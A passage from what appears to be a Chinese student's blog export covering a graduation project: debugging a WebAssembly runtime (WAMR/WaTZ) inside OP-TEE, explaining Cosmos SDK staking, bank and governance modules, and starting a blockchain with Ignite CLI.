target_info.e_type);</span><br><span class=\"line\">read_uint16(p, p_end, target_info.e_machine);</span><br><span class=\"line\">read_uint32(p, p_end, target_info.e_version);</span><br><span class=\"line\">read_uint32(p, p_end, target_info.e_flags);</span><br><span class=\"line\">read_uint32(p, p_end, target_info.reserved);</span><br><span class=\"line\">read_byte_array(p, p_end, target_info.arch, <span class=\"keyword\">sizeof</span>(target_info.arch));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (p != buf_end) {</span><br><span class=\"line\">    <span class=\"comment\">// set_error_buf(error_buf, error_buf_size, \"invalid section size\");</span></span><br><span class=\"line\">    set_error_buf_v(error_buf, error_buf_size, <span class=\"string\">\"invalid section size, \"</span></span><br><span class=\"line\">                    <span class=\"string\">\"p=%p, buf_end=%p, buf=%p\"</span>, p, buf_end, buf);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure>\n<img src=\"/graduation-project/06/image-20241030164512775.png\" alt=\"image-20241030164512775\">\n<figcaption aria-hidden=\"true\">image-20241030164512775</figcaption>\n</figure>\n<p>差了 12 位。</p>\n<p>说明是在读取 <code>AOT_SECTION_TYPE_TARGET_INFO</code> 即 AOT 的\n<strong>Target Info Section</strong>（目标信息段）的时候发生的错误。</p>\n<p>这个段的主要作用是提供以下关于目标平台的信息，以确保 AOT\n模块的代码可以正确加载并运行：</p>\n<ol type=\"1\">\n<li><strong>平台字节序</strong>：是否为小端序（Little-endian）或大端序（Big-endian）。</li>\n<li><strong>架构位数</strong>：是否为 32 位或 64 位平台。</li>\n<li><strong>目标处理器架构类型</strong>：比如 x86、ARM、MIPS\n等，确保编译出的代码与处理器架构匹配。</li>\n<li><strong>ABI（Application Binary\nInterface）类型</strong>：不同平台可能会使用不同的\nABI，确保函数调用、数据传递等方式正确。</li>\n<li><strong>额外标识</strong>：包含与特定平台相关的附加信息，如编译时的标志等。</li>\n</ol>\n<p>我看了一下现在的 <code>wasm</code>\n的代码，发现这里的数据结构变了！！</p>\n<p>现在的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Target info, read from ELF header of object file */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">AOTTargetInfo</span> {</span></span><br><span class=\"line\">    <span class=\"comment\">/* Binary type, elf32l/elf32b/elf64l/elf64b */</span></span><br><span class=\"line\">    uint16 bin_type;</span><br><span class=\"line\">    <span class=\"comment\">/* ABI type */</span></span><br><span class=\"line\">    uint16 abi_type;</span><br><span class=\"line\">    <span class=\"comment\">/* Object file type */</span></span><br><span class=\"line\">    uint16 e_type;</span><br><span class=\"line\">    <span class=\"comment\">/* Architecture */</span></span><br><span class=\"line\">    uint16 e_machine;</span><br><span class=\"line\">    <span class=\"comment\">/* Object file version */</span></span><br><span class=\"line\">    uint32 e_version;</span><br><span class=\"line\">    <span class=\"comment\">/* Processor-specific flags */</span></span><br><span class=\"line\">    uint32 e_flags;</span><br><span class=\"line\">    <span class=\"comment\">/* Specify wasm features supported */</span></span><br><span class=\"line\">    uint64 feature_flags;</span><br><span class=\"line\">    <span class=\"comment\">/* Reserved */</span></span><br><span class=\"line\">    uint64 reserved;</span><br><span class=\"line\">    <span class=\"comment\">/* Arch name */</span></span><br><span class=\"line\">    <span class=\"type\">char</span> arch[<span class=\"number\">16</span>];</span><br><span class=\"line\">} AOTTargetInfo;</span><br></pre></td></tr></table></figure>\n<p>之前的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Target info, read from ELF header of object file */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">AOTTargetInfo</span> {</span></span><br><span class=\"line\">    <span class=\"comment\">/* Binary type, elf32l/elf32b/elf64l/elf64b */</span></span><br><span class=\"line\">    uint16 bin_type;</span><br><span class=\"line\">    <span class=\"comment\">/* ABI type */</span></span><br><span class=\"line\">    uint16 abi_type;</span><br><span class=\"line\">    <span class=\"comment\">/* Object file type */</span></span><br><span class=\"line\">    uint16 e_type;</span><br><span class=\"line\">    <span class=\"comment\">/* Architecture */</span></span><br><span class=\"line\">    uint16 e_machine;</span><br><span class=\"line\">    <span class=\"comment\">/* Object file version */</span></span><br><span class=\"line\">    uint32 e_version;</span><br><span class=\"line\">    <span class=\"comment\">/* Processor-specific flags */</span></span><br><span class=\"line\">    uint32 e_flags;</span><br><span class=\"line\">    <span class=\"comment\">/* Reserved */</span></span><br><span class=\"line\">    uint32 reserved;</span><br><span class=\"line\">    <span class=\"comment\">/* Arch name */</span></span><br><span class=\"line\">    <span class=\"type\">char</span> arch[<span class=\"number\">16</span>];</span><br><span class=\"line\">} AOTTargetInfo;</span><br></pre></td></tr></table></figure>\n<p>也就是说，<code>WATZ</code> 的代码只支持运行老版本的 wasm\n程序，新版本的 wasm 就会类型不匹配。</p>\n<p>现在有两个方法：</p>\n<ol type=\"1\">\n<li>移植 runtime，以适应最新的版本.</li>\n<li>直接使用 watz 里的 runtime 进行 wasm 的编译，编译得到老版本的\nwasm.</li>\n</ol>\n<p>根据 <a href=\"##WASM%20与%20AOT%20的补充\">附录-WASM 与 AOT 的补充</a>\n，方案二更合理，相当于我们基于的就是老版本的 wamr\n，使用我这个项目必须用我们的 <code>wasmc</code> 将 <code>wasm</code>\n文件转换为 <code>aot</code>。</p>\n<p>目测了一下变化不小，我先用方法二测试一下 watz\n移植的有没有问题吧。</p>\n<p>下载 <code>WATZ</code> 使用的 <code>wasm-micro-runtime</code>\n版本：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone --no-checkout https:<span class=\"comment\">//github.com/bytecodealliance/wasm-micro-runtime.git wasm-micro-runtime-cba4c782</span></span><br><span class=\"line\">cd wasm-micro-runtime-cba4c782</span><br><span class=\"line\">git checkout cba4c782</span><br></pre></td></tr></table></figure>\n<p>编译 <code>wamrc</code> 详细内容见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dGVjb2RlYWxsaWFuY2Uvd2FzbS1taWNyby1ydW50aW1lL2Jsb2IvbWFpbi93YW1yLWNvbXBpbGVyL1JFQURNRS5tZA==\">官方文档<i class=\"fa fa-external-link-alt\"></i></span>\n：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> wamr-compiler</span><br><span class=\"line\">./build_llvm.sh (or <span class=\"string\">\"./build_llvm_xtensa.sh\"</span> to support xtensa target)</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> build &amp;&amp; <span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake .. (or <span class=\"string\">\"cmake .. -DWAMR_BUILD_PLATFORM=darwin\"</span> <span class=\"keyword\">for</span> MacOS)</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p>重新编译 <code>aot</code> 文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./wamrc --target=aarch64 -o hello_aarch64.aot hello.wasm</span><br></pre></td></tr></table></figure>\n<p>很遗憾，报了新的错：</p>\n<figure>\n<img src=\"/graduation-project/06/image-20241030210559791.png\" alt=\"image-20241030210559791\">\n<figcaption aria-hidden=\"true\">image-20241030210559791</figcaption>\n</figure>\n<p>但是已经从 load failed 变成了 instantiate failed 了，进了一步233</p>\n<p>定位错误位置：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">wasm_runtime_instantiate_internal -&gt; aot_instantiate -&gt; memories_instantiate -&gt; memory_instantiate</span><br></pre></td></tr></table></figure>\n<p>沃趣，de了半天 bug，发现是 heap_size 设置的大小不合适：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">optee_wamr 4096000 hello_aarch64.aot </span><br></pre></td></tr></table></figure>\n<figure>\n<img src=\"/graduation-project/06/image-20241030222255649.png\" alt=\"image-20241030222255649\">\n<figcaption aria-hidden=\"true\">image-20241030222255649</figcaption>\n</figure>\n<p>经过二分的测试，上下界：<code>[408340, 12573936]</code></p>\n<p>所以截止当前！已经可以在 OPTEE 中运行 wasm 的程序了！</p>\n<h1 id=\"总结\">总结</h1>\n<ol type=\"1\">\n<li><p>提供的 <code>aot</code> 文件，必须由老版本的\n<code>wasm-micro-runtime</code> 的 <code>wasmc</code>\n编译得到。</p></li>\n<li><p><del>提供的 <code>wasm</code> 文件可以任选编译器，因为\n<code>wasm</code> 有官方标准，而 <code>aot</code>\n每个编译器有自己的标准。</del></p>\n<p>目前测试结果：</p>\n<table>\n<thead>\n<tr>\n<th>编译器</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>emcc</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>wasi-sdk</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>待补充</td>\n<td></td>\n</tr>\n</tbody>\n</table></li>\n<li><p>运行时的堆空间上下界为\n<code>[408340, 12573936]</code>。可能不同的环境中，这个数值会有所不同，还不太清楚。\n总之取一个中间数比较稳，例如 1000000 一百万。</p></li>\n</ol>\n<p>明天的工作：</p>\n<p>整理一遍 WATZ 的移植，并开源一个项目。</p>\n<p>然后思考接下来的工作，wasm + 智能合约。</p>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"wasm-与-aot-的补充\">WASM 与 AOT 的补充</h2>\n<p><code>wasm</code> 是有一个标准的，不同的 <code>wasm</code> 编译器（如\nEmscripten、AssemblyScript、WasmEdge）可能会有不同的优化，生成的\n<code>wasm</code>\n文件不完全一样，但是最终的执行效果应该是等价的。并且编译出来的\n<code>wasm</code> 文件能被任何运行时理解。</p>\n<p>但是 <code>AOT</code> 不同。<code>AOT</code> 是由特定的编译器，将\n<code>wasm</code> 文件转换成对应的 <code>aot</code> 文件。每个编译器生成\n<code>aot</code> 文件的格式都是不一样的。</p>\n<p>因此，我移植了老版的 <code>wasm-micro-runtime</code>\n运行时，就必须用老版运行时中提供的 <code>wamrc</code> 将\n<code>wasm</code> 文件编译成 <code>aot</code> 文件才能使用。</p>\n","categories":["笔记"],"tags":["WebAssembly","TrustZone","毕设","op-tee","WaTZ"]},{"title":"毕设07 - Cosmos 简介与 Cosmos SDK 模块详解","url":"/graduation-project/07/","content":"<p>截止目前，已经成功在 optee 中运行 wasm 程序。</p>\n<p>接下来要尝试怎么用 wasm 实现智能合约。</p>\n<p>技术选型为 Cosmos。</p>\n<span id=\"more\"></span>\n<h1 id=\"cosmos-介绍\">1 Cosmos 介绍</h1>\n<p>https://zhuanlan.zhihu.com/p/59651447</p>\n<p>待补充，先进行代码的实验。</p>\n<h1 id=\"其他工具\">2 其他工具</h1>\n<h2 id=\"ignite-cli\">Ignite CLI</h2>\n<p><strong>Ignite</strong> 是一个用于快速构建基于 <strong>Cosmos\nSDK</strong>\n的区块链应用的开发工具。它提供了从模板生成、模块添加、代码生成到应用部署的一整套功能，帮助开发者简化开发流程。</p>\n<h1 id=\"cosmos-sdk-模块详解\">3 Cosmos SDK 模块详解</h1>\n<h2 id=\"staking\">1 staking</h2>\n<p>用于实现权益委托证明（PoS）公式机制。Pos\n取代的是工作量证明（PoW）机制。对区块的证明不再使用大量的计算——挖矿来实现，而是让用户把自己的代币（Token）作为质押，以获得验证资格。</p>\n<h3 id=\"pow-与-pos-的对比\">1.1 PoW 与 PoS 的对比</h3>\n<p><strong>PoW（Proof of Work，工作量证明）：</strong></p>\n<ul>\n<li>产生一个新的区块的过程依赖于矿工的计算能力（算力）。</li>\n<li>矿工通过大量计算，寻找一个符合难度目标的哈希值（例如开头为多个零的哈希值，常用的是\nSHA-256）。这一过程称为“挖矿”。</li>\n<li>一旦矿工成功找到符合条件的哈希值，就将这个新的区块及其哈希值提交到区块链网络。</li>\n<li>网络会验证该哈希值，若有效，则将区块加入主链，且矿工获得奖励（通常是代币奖励和交易手续费的组合）。</li>\n</ul>\n<p><strong>PoS（Proof of Stake，权益证明）：</strong></p>\n<ul>\n<li>用户通过质押代币来获得验证资格，质押的代币越多，被选为验证人的机会越大。</li>\n<li>当一个新的区块产生时，系统会从有验证资格的用户（验证人）中选择一个或多个用户来验证和打包该区块。</li>\n<li>验证人在验证区块后，将区块信息发送至网络。</li>\n<li>一旦区块得到确认，验证人获得奖励，通常以质押的代币奖励形式。</li>\n</ul>\n<h3 id=\"关键概念\">1.2 关键概念</h3>\n<ul>\n<li><p><strong>验证人（Validators）</strong>：</p>\n<ul>\n<li>验证人是运行节点并负责验证区块的用户。</li>\n<li>需要将自身或其他用户委托的代币作为抵押来获得验证资格。</li>\n<li>验证人会根据所抵押的代币数量来竞争进入“活跃验证人集合”，即质押的代币越多越容易被选中。</li>\n<li>验证人需要保持节点的高可用性和诚实性，若出现双签、宕机等情况会受到惩罚。</li>\n</ul></li>\n<li><p><strong>委托人（Delegators）</strong>：</p>\n<ul>\n<li>委托人是持有代币的用户，可以将代币委托给他们信任的验证人，以参与网络的共识过程。</li>\n<li>委托人将代币交给验证人后，便与验证人共同承担网络的安全性责任。验证人获得的奖励和惩罚也会按照比例分配给委托人。</li>\n<li>委托人有权选择撤回委托（即“解锁”），但是解锁过程通常需要经过一个解锁期，防止系统因频繁的资金移动而失稳。</li>\n</ul></li>\n<li><p><strong>抵押和解锁机制（Bonding and Unbonding）</strong>：</p>\n<ul>\n<li>当用户（无论是验证人还是委托人）将代币锁定在 staking\n模块中时，这些代币即被抵押。抵押的代币使验证人有资格进入活跃验证人集合。</li>\n<li>抵押的代币要解除时会经历一个“解锁期”（通常为几周），在这期间用户无法动用这部分代币。解锁期可以防止网络因大量代币突然解锁而失去安全性。</li>\n</ul></li>\n<li><p><strong>奖励分配（Reward Distribution）</strong>：</p>\n<ul>\n<li>staking 模块与分配奖励的 <strong>distribution</strong>\n模块协同工作，为验证人和委托人分配奖励。</li>\n<li>验证人可以设置佣金费率（即奖励的某一比例作为其运营费用），其余部分则分配给委托人。</li>\n<li>奖励的来源通常是区块链的通胀部分（增发代币）或交易手续费。</li>\n</ul></li>\n<li><p><strong>惩罚机制（Slashing）</strong></p>\n<ul>\n<li><p>为保障网络的安全，staking 模块配合 <strong>slashing</strong>\n模块引入了惩罚机制，旨在对不诚信或表现不佳的验证人进行惩罚。</p></li>\n<li><p>常见的惩罚行为有双签（Double Signing）和宕机（Downtime）。</p>\n<blockquote>\n<p>双签的例子：</p>\n<p>假设区块链网络发生了短暂分叉。验证人 A 在区块高度 100 签署了区块\nA_100。与此同时，网络中的另一部分在同一高度 100 也签署了另一个区块\nB_100。</p>\n<p>如果验证人 A 无意中在网络恢复后又对 B_100\n进行了签名，网络就会记录到验证人 A 在高度 100 发生了双签。</p>\n</blockquote></li>\n</ul></li>\n<li><p><strong>治理（Governance）参与</strong></p>\n<ul>\n<li>staking\n模块中的验证人和委托人都有权参与链上治理，即投票表决提案。这些提案可能包括升级链的参数或添加新功能。</li>\n<li>委托人通常会继承他们所选择的验证人的投票意向，但也可以自主投票，确保自身权益得到更好保障。</li>\n</ul></li>\n</ul>\n<h3 id=\"bft-与-staking\">1.3 BFT 与 staking</h3>\n<ul>\n<li>他们并不是同一层级的概念，BFT 共识协议在 Tendermint\n的共识层中实现。</li>\n<li>staking\n机制作用于<strong>验证人选拔和激励层</strong>，决定哪些验证人可以参与共识，并通过奖励和惩罚保障验证人的行为。</li>\n<li>BFT\n共识作用于<strong>共识层</strong>，解决已选出的验证人如何就区块内容达成一致的问题。</li>\n</ul>\n<h2 id=\"bank-模块\">2 bank 模块</h2>\n<p>Cosmos SDK 的 <code>bank</code>\n模块是一个核心模块，专门用于在账户之间实现可替代代币（fungible\ntokens）的转账。该模块提供了基本的代币管理功能，包括发送、接收、查询余额等，是\nCosmos SDK 应用中资金流转的基础。以下是 <code>bank</code>\n模块的详细介绍：</p>\n<h3 id=\"模块概述\">2.1 <strong>模块概述</strong></h3>\n<ul>\n<li><code>bank</code> 模块负责管理账户中的可替代代币（如 Cosmos 的 ATOM\n或应用链自定义的代币）。</li>\n<li>提供了基本的转账功能，允许账户之间进行代币转移。</li>\n<li>支持自定义多个代币（多资产）和配置转账权限（如黑名单、白名单等）。</li>\n</ul>\n<h3 id=\"主要功能\">2.2 <strong>主要功能</strong></h3>\n<ul>\n<li><strong>转账（Transfers）</strong>：实现账户之间的代币转移，并通过权限控制（如\n<code>send_enabled</code>）设置哪些代币可以进行转账。</li>\n<li><strong>查询余额（Balance\nQueries）</strong>：允许查询指定账户的代币余额，并支持查询所有代币余额。</li>\n<li><strong>多资产支持（Multi-Asset\nSupport）</strong>：支持在链上创建和管理多个类型的代币，每种代币都可以独立操作。</li>\n</ul>\n<h3 id=\"账户类型\">2.3 <strong>账户类型</strong></h3>\n<ul>\n<li>Cosmos SDK 的 <code>bank</code>\n模块将每个账户的代币余额存储在账户模块（<code>auth</code>）的\n<code>Account</code>\n对象中。每个账户有一个唯一的地址和一个与之关联的余额。</li>\n<li>账户类型通常有：\n<ul>\n<li><strong>BaseAccount</strong>：标准账户，用于存储基本的余额和公钥信息。</li>\n<li><strong>ModuleAccount</strong>：模块账户，通常用于协议或模块操作的资金池，比如治理模块的储备资金。</li>\n</ul></li>\n</ul>\n<h3 id=\"转账权限控制\">2.4 <strong>转账权限控制</strong></h3>\n<ul>\n<li><code>bank</code>\n模块允许设置特定代币的转账权限，主要用于控制哪些代币可以转账、是否暂停某类代币的转账等。</li>\n<li>通过 <code>SendEnabled</code>\n配置参数，可以启用或禁用某种特定代币的转账功能。这对于防止恶意代币或临时冻结某些代币具有重要意义。</li>\n</ul>\n<h3 id=\"关键操作流程\">2.5 <strong>关键操作流程</strong></h3>\n<ul>\n<li><strong>发送代币流程</strong>：\n<ul>\n<li>用户通过提交 <code>MsgSend</code> 消息请求发送代币。</li>\n<li><code>bank</code>\n模块验证发送者的余额是否充足，并确保接收者的地址有效。</li>\n<li>代币成功从发送者账户转移到接收者账户，事件系统记录该转账事件。</li>\n</ul></li>\n<li><strong>批量转账流程</strong>：\n<ul>\n<li>用户通过提交 <code>MsgMultiSend</code>\n消息请求多个账户之间的批量转账。</li>\n<li>模块会验证所有发送方的余额是否足够，并在验证成功后批量执行转账操作。</li>\n</ul></li>\n</ul>\n<h3 id=\"与其他模块的交互\">2.6 <strong>与其他模块的交互</strong></h3>\n<ul>\n<li><code>bank</code> 模块通常会与以下模块交互：\n<ul>\n<li><strong>auth 模块</strong>：管理账户结构及其权限，与\n<code>bank</code> 模块协作存储和读取账户的余额信息。</li>\n<li><strong>staking\n模块</strong>：当用户将代币抵押给验证人时，这些代币会从\n<code>bank</code>\n模块中“冻结”，不可转账，形成一种账户余额的“锁定”状态。</li>\n<li><strong>distribution\n模块</strong>：用于将奖励分配给验证人和委托人，资金通过\n<code>bank</code> 模块进行流转。</li>\n</ul></li>\n</ul>\n<h2 id=\"gov\">3 gov</h2>\n<h3 id=\"模块概述-1\">3.1 模块概述</h3>\n<ul>\n<li><code>gov</code>\n模块是一个链上治理系统，允许任何代币持有者发起提案，并通过社区投票来决定提案是否通过。</li>\n<li>主要功能包括提案创建、投票过程、提案生效与否的判定等。</li>\n<li><code>gov</code>\n模块使区块链变得更具弹性和适应性，代币持有者可以直接参与协议的变更。</li>\n</ul>\n<h3 id=\"提案类型\">3.2 提案类型</h3>\n<p><code>gov</code>\n模块支持多种提案类型，每种类型对应链上不同的管理事项：</p>\n<ul>\n<li><strong>文本提案（Text\nProposal）</strong>：仅供讨论和表决的提案，没有直接操作链上参数的权限，通常用于提出改进建议或社区讨论。</li>\n<li><strong>参数变更提案（Parameter Change\nProposal）</strong>：提议修改链上的参数配置（如交易费用、质押参数等），通过后自动更新链上参数。</li>\n<li><strong>软件升级提案（Software Upgrade\nProposal）</strong>：提议进行链上软件升级。通过后链上的升级模块会执行更新。</li>\n<li><strong>社区资金提案（Community Pool Spend\nProposal）</strong>：提议从社区资金池中提取资金，支持对某些项目或社区活动进行资助。</li>\n</ul>\n<h3 id=\"提案生命周期\">3.3 <strong>提案生命周期</strong></h3>\n<ul>\n<li><strong>提交提案</strong>：用户提交提案并支付一定数量的代币作为押金，押金可防止垃圾提案泛滥。若提案未通过押金将被扣除。</li>\n<li><strong>存款阶段（Deposit\nPeriod）</strong>：提案需要达到一定的存款门槛（通常是由其他用户补充押金），才能进入投票阶段。</li>\n<li><strong>投票阶段（Voting\nPeriod）</strong>：提案进入投票阶段后，所有有投票权的代币持有者都可以对其进行投票。</li>\n<li><strong>投票结果</strong>：在投票阶段结束后，系统根据预设的通过标准判断提案是否通过。</li>\n<li><strong>提案结果执行</strong>：若提案通过，则根据提案的类型执行相应操作；若未通过，则押金会被退还或销毁。</li>\n</ul>\n<h3 id=\"投票机制\">3.4 <strong>投票机制</strong></h3>\n<p><code>gov</code>\n模块允许所有拥有投票权的代币持有者对提案进行投票。投票方式通常包括以下几种：</p>\n<ul>\n<li><p><strong>Yes</strong>：赞成提案。</p></li>\n<li><p><strong>No</strong>：反对提案。</p></li>\n<li><p><strong>NoWithVeto</strong>：强烈反对提案并主张否决，若此选项票数达到一定比例，提案将被直接拒绝，且押金会被销毁。</p></li>\n<li><p><strong>Abstain</strong>：弃权，表示中立意见，弃权票不影响提案通过率的计算。</p></li>\n<li><p><strong>通过标准</strong>：提案的通过率由参数控制，通常包括最低投票参与率、赞成票占比等。只有满足这些标准，提案才会被视为通过。</p></li>\n</ul>\n<h3 id=\"section\"></h3>\n<h3 id=\"存款机制\">3.5 <strong>存款机制</strong></h3>\n<ul>\n<li>提案发起时需要支付一定数量的押金（Deposit），押金的数量和形式由治理参数决定。</li>\n<li>如果提案未达到存款门槛，提案将不会进入投票阶段；未达到存款门槛的提案在一定时间后会被自动关闭，押金返还。</li>\n<li>若提案被否决或否决比例超过特定标准，押金可能会被销毁，以减少恶意提案的产生。</li>\n</ul>\n<h3 id=\"与其他模块的交互-1\">3.6 与其他模块的交互</h3>\n<ul>\n<li><strong>bank\n模块</strong>：在用户支付提案押金、提取社区资金等操作时，需要与\n<code>bank</code> 模块交互来转移代币。</li>\n<li><strong>distribution\n模块</strong>：在社区资金提案通过后，<code>gov</code> 模块会调用\n<code>distribution</code> 模块以分配社区资金。</li>\n<li><strong>staking 模块</strong>：治理模块与 staking\n模块交互，以决定未投票用户的投票意向是否与其所委托的验证人一致。</li>\n</ul>\n<h3 id=\"提案流程示例\">3.7 提案流程示例</h3>\n<ul>\n<li>用户创建一个新提案并支付最小押金。</li>\n<li>其他用户可以为该提案增加押金，直到达到最低存款要求。</li>\n<li>达到要求后提案进入投票阶段，代币持有者在 <code>VotingPeriod</code>\n内可以对提案进行投票。</li>\n<li>投票结束后，系统依据投票结果判断提案是否通过，并触发相应的操作（如更改参数、升级软件等）。</li>\n</ul>\n<h2 id=\"slashing\">4 slashing</h2>\n<h2 id=\"distribution\">5 distribution</h2>\n<h2 id=\"auth\">6 auth</h2>\n","categories":["笔记"],"tags":["区块链","毕设","Cosmos"]},{"title":"毕设08 - Cosmos 构建自己的区块链","url":"/graduation-project/08/","content":"<p>根据 https://docs.ignite.com/guide/getting-started 中的教程，实现一个\nCosmos 区块链的搭建。</p>\n<p>使用 ignite 提供的自动化构建脚本，实现 Cosmos\n区块链的搭建和模块设计。</p>\n<p>内容不全面，详细的看链接网站。</p>\n<p>但是因为 ignite 封装太多了，没完全明白如何继承模块。</p>\n<p>本文为摸索过程中的记录，不适合学习。请看毕设10，比较适合参考学习。</p>\n<span id=\"more\"></span>\n<h1 id=\"前置准备\">前置准备</h1>\n<ul>\n<li><p>安装 go (1.21+)</p>\n<p>https://ubuntuhandbook.org/index.php/2024/02/how-to-install-go-golang-1-22-in-ubuntu-22-04/#google_vignette</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget -c https://go.dev/dl/go1.23.1.linux-amd64.tar.gz</span><br><span class=\"line\">tar -C /usr/local/ -xzf go1.23.1.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure></p>\n<p>在 <code>~/.bashrc</code> 中添加：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -d <span class=\"string\">\"/usr/local/go/bin\"</span> ] ; <span class=\"keyword\">then</span></span><br><span class=\"line\">    PATH=<span class=\"string\">\"/usr/local/go/bin:<span class=\"variable\">$PATH</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure></p>\n<p>重新载入 <code>~/.bashrc</code>：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>设置中国代理：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">go env -w GO111MODULE=on</span><br><span class=\"line\">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</span><br></pre></td></tr></table></figure></p></li>\n<li><p>安装 Ignite CLI</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo snap set system proxy.http=\"http://192.168.3.56:21882\"</span><br><span class=\"line\">sudo snap set system proxy.https=\"http://192.168.3.56:21882\"</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl restart snapd</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">snap install ignite --classic</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<h1 id=\"创建一个新的区块链\">1 创建一个新的区块链</h1>\n<p>要使用 Ignite 创建一个新的区块链项目，需要运行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ignite scaffold chain example</span><br></pre></td></tr></table></figure>\n<p>在国内，安装过程中可能会有很多报错，都是代理的问题。安装成功之后输出如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@cishoon-virtual-machine:~/go]# ignite scaffold chain example</span><br><span class=\"line\"></span><br><span class=\"line\">⭐️ Successfully created a new blockchain 'example'.</span><br><span class=\"line\">👉 Get started with the following commands:</span><br><span class=\"line\"></span><br><span class=\"line\"> % cd example</span><br><span class=\"line\"> % ignite chain serve</span><br><span class=\"line\"></span><br><span class=\"line\">Documentation: https://docs.ignite.com</span><br></pre></td></tr></table></figure>\n<p>新目录 example 中创建一个新的基于 Cosmos SDK\n的区块链。默认导入了多个标准模块：</p>\n<ul>\n<li><strong>staking</strong>：用于实现 PoS 共识机制。</li>\n<li><strong>bank</strong>：用于实现代币的转账。</li>\n<li><strong>gov</strong>：用于链上治理。</li>\n</ul>\n<h2 id=\"目录结构\">1.1 目录结构</h2>\n<ul>\n<li><strong>app/\n目录</strong>：包含连接区块链各部分的文件。该目录中最重要的文件是\n<code>app.go</code>，它包含区块链的类型定义以及创建和初始化区块链的函数。此文件负责将区块链的各个组件连接在一起，并定义它们之间的交互方式。</li>\n<li><strong>cmd/\n目录</strong>：包含负责已编译二进制文件的命令行接口（CLI）的主程序包。此程序包定义了可以通过\nCLI\n运行的命令以及它们的执行方式。它是区块链项目的重要组成部分，为开发人员和用户提供了一种与区块链交互的方式，例如查询区块链状态或发送交易。</li>\n<li><strong>proto/ 目录</strong>：包含协议缓冲区（protocol\nbuffer）文件，用于描述区块链的数据结构。协议缓冲区是一种语言和平台无关的机制，用于序列化结构化数据，通常用于分布式系统（如区块链网络）的开发。<code>proto/</code>\n目录中的协议缓冲区文件定义了区块链使用的数据结构和消息，并用于生成可用于与区块链交互的各种编程语言的代码。在\nCosmos SDK\n中，协议缓冲区文件用于定义可以被区块链发送和接收的特定数据类型，以及可用于访问区块链功能的特定\nRPC 端点。</li>\n<li><strong>testutil/\n目录</strong>：包含用于测试的辅助函数。这些函数提供了一种方便的方式来执行编写区块链测试时所需的常见任务，例如创建测试账户、生成交易以及检查区块链状态。使用\n<code>testutil/</code>\n目录中的辅助函数，开发人员可以更快速、高效地编写测试，并确保测试全面而有效。</li>\n<li><strong>x/ 目录</strong>：包含添加到区块链的自定义 Cosmos SDK\n模块。标准的 Cosmos SDK 模块是预构建的组件，提供了 Cosmos SDK\n区块链的常见功能，例如质押和治理支持。另一方面，自定义模块是专门为区块链项目开发的模块，用于提供特定的项目功能。</li>\n<li><strong>config.yml\n文件</strong>：是一个配置文件，用于在开发过程中自定义区块链。该文件包含控制区块链各方面的设置，例如网络\nID、账户余额和节点参数等。</li>\n</ul>\n<h1 id=\"启用项目\">2 启用项目</h1>\n<p>执行以下命令启用区块链：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ignite chain serve</span><br></pre></td></tr></table></figure>\n<p><code>ignite chain serve</code>\n命令用于在开发模式下启动区块链节点。该命令首先使用\n<code>ignite chain build</code> 编译并安装二进制文件，然后使用\n<code>ignite chain init</code>\n初始化单个验证人的区块链数据目录。之后，它会在本地启动节点，并启用自动代码重载功能，使代码的更改可以直接反映在运行中的区块链上，而无需重启节点。这样可以加快区块链的开发和测试进程。</p>\n<h1 id=\"hello-world\">3 Hello World!</h1>\n<p>在本教程中，你将使用 Ignite CLI\n构建一个简单的区块链，该区块链响应一个自定义查询并返回 \"Hello %s!\"，其中\n\"%s\" 是查询中传入的名字。通过此教程，你将更深入地了解如何在 Cosmos SDK\n区块链中<strong>创建自定义查询</strong>。</p>\n<h2 